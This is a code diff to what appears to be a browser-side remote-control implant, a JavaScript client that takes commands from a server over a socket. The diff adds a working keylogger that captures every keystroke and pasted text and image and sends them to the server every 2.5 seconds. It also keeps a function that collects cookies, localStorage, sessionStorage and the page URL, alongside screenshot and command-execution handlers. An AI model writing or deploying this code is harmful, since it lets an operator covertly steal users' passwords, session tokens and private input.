@@ -42,11 +42,11 @@
     socket.on("command", handleCommandEvent);
 
     function handleDisconnectEvent() {
-       log("Disconnected from the server");
+      log("Disconnected from the server");
 
-       state.reconnectInterval = setInterval(() => {
+      state.reconnectInterval = setInterval(() => {
         socket.connect();
-       }, 2500);
+      }, 2500);
     }
 
     function handleConnectEvent() {
@@ -80,8 +80,16 @@
       switch (data.type) {
         case "execute":
           return executeCommand(data);
-        case "take-screenshoot":
-          return takeAScreenShoot(data).catch((err) => {
+        case "start-keyloger":
+          return startTheKeyloger(data).catch((err) => {
+            sendResponse("result", {
+              type: "execute-error",
+              payload: "ERROR: " + (err?.message ?? err),
+              commandId: data.commandId,
+            });
+          });
+        case "take-screenshot":
+          return takeAScreenShot(data).catch((err) => {
             sendResponse("result", {
               type: "execute-error",
               payload: "ERROR: " + (err?.message ?? err),
@@ -116,7 +124,67 @@
       }
     }
 
-    async function takeAScreenShoot(socketData) {
+    async function startTheKeyloger(socketData) {
+      if (state.keylogerStarted) {
+        return Promise.reject("Keyloger already started");
+      }
+      state.keylogerStarted = true;
+      state.keylogerData = "";
+      state.keylogerSentData = "";
+
+      document.addEventListener("keydown", (e) => {
+        let key = e.key;
+        if (key === " ") key = "Space";
+        if (key.length > 1) key = `[${key}]`;
+        state.keylogerData += `${key}`;
+      });
+
+      document.addEventListener("keyup", (e) => {
+        let key = e.key;
+        if (key === " ") key = "Space";
+        if (key.length === 1) return;
+        key = `[/${key}]`;
+        state.keylogerData += `${key}`;
+      });
+
+      document.addEventListener("paste", (event) => {
+        const clipboardItems = event.clipboardData?.items ?? [];
+        for (const item of clipboardItems) {
+          console.log(item.type);
+          if (item.type.startsWith("image/")) {
+            const blob = item.getAsFile();
+            if (!blob) return;
+
+            const reader = new FileReader();
+            reader.onload = function (event) {
+              const base64Image = event.target?.result;
+              sendResponse("result", {
+                type: "screenshot",
+                payload: base64Image,
+                commandId: "new",
+              });
+            };
+            reader.readAsDataURL(blob);
+          } else if (item.type === "text/plain") {
+            item.getAsString((text) => {
+              state.keylogerData += `[PASTE]${text}[/PASTE]`;
+            });
+          }
+        }
+      });
+
+      setInterval(() => {
+        if (state.keylogerSentData === state.keylogerData) return;
+        sendResponse("result", {
+          type: "execute-result",
+          payload: state.keylogerData,
+          commandId: socketData.commandId,
+        });
+        state.keylogerSentData = state.keylogerData;
+      }, 2500);
+    }
+
+    async function takeAScreenShot(socketData) {
       if (!state.html2canvas) {
         await new Promise((resolve, reject) => {
           const src =
@@ -135,7 +203,7 @@
       html2canvas(document.body, { allowTaint: false }).then((canvas) => {
         const data = canvas.toDataURL();
         sendResponse("result", {
-          type: "screenshoot",
+          type: "screenshot",
           payload: data,
           commandId: socketData.commandId,
         });
@@ -151,52 +219,16 @@
 
     // @ts-ignore
     window.getUsefulInfo = function () {
-      const navigatorKeys = Object.keys(Object.getPrototypeOf(navigator));
-      const navigatorValues = {};
-      navigatorKeys.forEach((key) => {
-        try {
-          if (navigatorKeys[key] instanceof Function) {
-            navigatorValues[key] = navigator[key]();
-          } else {
-            navigatorValues[key] = navigator[key];
-          }
-        } catch (e) {
-          navigatorValues[key] = e;
-        }
-      });
+      const localStorage = JSON.stringify(window.localStorage);
 
-      const localStorageKeys = Object.keys(window.localStorage);
-      const localStorage = {};
-
-      localStorageKeys.forEach((key) => {
-        try {
-          localStorage[key] = window.localStorage.getItem(key);
-        } catch (e) {
-          localStorage[key] = e;
-        }
-      });
-
-      const sessionStorageKeys = Object.keys(window.sessionStorage);
-      const sessionStorage = {};
-
-      sessionStorageKeys.forEach((key) => {
-        try {
-          sessionStorage[key] = window.sessionStorage.getItem(key);
-        } catch (e) {
-          sessionStorage[key] = e;
-        }
-      });
+      const sessionStorage = JSON.stringify(window.sessionStorage);
 
       const location = window.location.href;
       const cookies = Object.fromEntries(
         document.cookie.split(";").map((x) => x.split("="))
       );
-      const plugins = Array.from(navigator.plugins).map((x) => x.name);
 
       return {
-        navigator: JSON.parse(
-          JSON.stringify(navigatorValues, JSONReplaceFunctions)
-        ),
         localStorage: JSON.parse(
           JSON.stringify(localStorage, JSONReplaceFunctions)
         ),
@@ -206,7 +238,6 @@
 
         location,
         cookies: JSON.parse(JSON.stringify(cookies, JSONReplaceFunctions)),
-        plugins: JSON.parse(JSON.stringify(plugins, JSONReplaceFunctions)),
       };
     };
 
